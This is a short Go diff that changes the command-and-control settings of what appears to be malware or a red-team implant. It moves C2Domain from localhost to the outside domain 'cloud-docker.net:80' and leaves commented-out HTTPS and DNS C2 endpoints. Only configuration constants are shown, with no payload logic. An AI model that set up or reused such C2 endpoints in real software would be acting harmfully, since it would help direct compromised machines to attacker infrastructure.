@@ -6,8 +6,7 @@ import (
 )
 
 const (
-	C2Domain = "localhost:80"
-	// C2Domain  = "cloud-docker.net"
+	C2Domain  = "cloud-docker.net:80"
 	DNSServer = "8.8.8.8:53"
 	//C2HTTPSURI            = "https://localhost"
 	//C2DNSDOMAIN           = "cloud-docker.com"
